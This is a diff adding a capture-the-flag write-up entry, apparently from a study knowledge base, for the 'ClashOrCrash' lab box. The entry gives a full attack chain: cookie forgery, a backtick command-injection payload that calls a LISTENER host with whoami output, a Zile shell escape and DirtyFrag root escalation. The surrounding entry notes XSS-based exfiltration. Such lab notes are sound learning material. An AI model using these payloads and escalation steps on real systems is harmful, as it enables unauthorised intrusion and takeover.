@@ -2633,5 +2633,73 @@
     ],
     "summary": "Enumerasi internal API NoExtraordinary via XSS primitives: source code admin dashboard diekstrak untuk map API structure, performance.getEntries() digunakan untuk enumerate URL yang di-load bot, fetch hook di-inject untuk intercept API_BASE resolution. Constraint kritis: bot navigate away sebelum async Promise resolve, sehingga exfil harus menggunakan synchronous methods (innerText, document.cookie) untuk reliable extraction.",
     "url": ""
+  },
+  {
+    "id": "hacktrace-clashorcrash",
+    "date": "2026-06-01",
+    "title": "ClashOrCrash — Broken Access Control, Stored Command Injection & DirtyFrag PrivEsc (Easy, Offensive)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "ctf",
+      "offensive-security",
+      "web-exploitation",
+      "command-injection",
+      "privilege-escalation",
+      "broken-access-control",
+      "gtfobins",
+      "dirtyfrag",
+      "hacktrace",
+      "easy"
+    ],
+    "concepts": [
+      "Broken Access Control via cookie forgery: set admin_login=true cookie untuk bypass HTTP 403 pada admin panel — OWASP Top 10 A01:2021",
+      "Stored Command Injection pattern: injection point bukan receiving endpoint tapi processing endpoint (export.php) yang shell_exec/bash_eval data yang di-store sebelumnya",
+      "Backtick command substitution dalam POST parameter (playertag field) sebagai RCE vector — `whoami` dieksekusi saat export.php memproses stored data",
+      "Crash report analysis untuk identifikasi vulnerable functions (bash_eval, shell_exec) dan trace injection path melalui export.php",
+      "GTFOBins lateral movement: Zile text editor dengan sudo -u barbarian_king untuk spawn shell sebagai user lain via M-x shell-command",
+      "DirtyFrag privilege escalation via SUID sudo binary non-standard path (/opt/sudo-1.9.13p3/bin/sudo)",
+      "TMPDIR=/dev/shm workaround untuk GCC compilation ketika /tmp tidak writable"
+    ],
+    "terms": [
+      "Broken Access Control",
+      "OWASP A01:2021",
+      "cookie forgery",
+      "admin_login=true",
+      "stored command injection",
+      "blind command injection",
+      "backtick command substitution",
+      "shell_exec",
+      "bash_eval",
+      "export.php",
+      "crash report analysis",
+      "GTFOBins",
+      "Zile text editor",
+      "M-x shell-command",
+      "DirtyFrag",
+      "SUID sudo",
+      "TMPDIR",
+      "/dev/shm",
+      "lateral movement",
+      "www-data",
+      "barbarian_king"
+    ],
+    "commands": [
+      "curl -b 'admin_login=true' http://target/admin/",
+      "curl -X POST -d 'playertag=`curl LISTENER/$(whoami)`' http://target/submit",
+      "curl http://target/export.php",
+      "sudo -u barbarian_king /usr/bin/zile",
+      "M-x shell-command (Zile GTFOBins)",
+      "TMPDIR=/dev/shm ./dirtyfrag"
+    ],
+    "problems": [
+      "Admin panel mengembalikan 403 — bypass dengan forge cookie admin_login=true",
+      "Command injection via playertag tidak triggered di endpoint submission — injection hanya dieksekusi saat export.php memproses stored data (stored injection pattern)",
+      "Identifikasi bash_eval dan shell_exec sebagai vulnerable functions dari crash report, bukan dari source code langsung",
+      "Lateral movement dari www-data ke barbarian_king menggunakan Zile editor GTFOBins entry",
+      "GCC compilation gagal karena /tmp tidak writable — workaround dengan TMPDIR=/dev/shm sebelum jalankan DirtyFrag"
+    ],
+    "summary": "Pwn box ClashOrCrash dari Hacktrace Ranges (Easy, Offensive). Attack chain: cookie forgery (admin_login=true) bypass 403 admin panel → stored command injection via backtick substitution di playertag POST parameter, triggered oleh export.php yang bash_eval/shell_exec stored data → initial shell sebagai www-data → lateral movement ke barbarian_king via Zile GTFOBins (sudo -u barbarian_king /usr/bin/zile, shell via M-x shell-command) → privilege escalation ke root via DirtyFrag exploit terhadap SUID sudo binary non-standard (/opt/sudo-1.9.13p3/bin/sudo), dengan TMPDIR=/dev/shm workaround karena /tmp tidak writable. Key learning: stored injection pattern berbeda dari reflected — injection point dan execution point adalah endpoint yang berbeda.",
+    "url": ""
   }
 ]
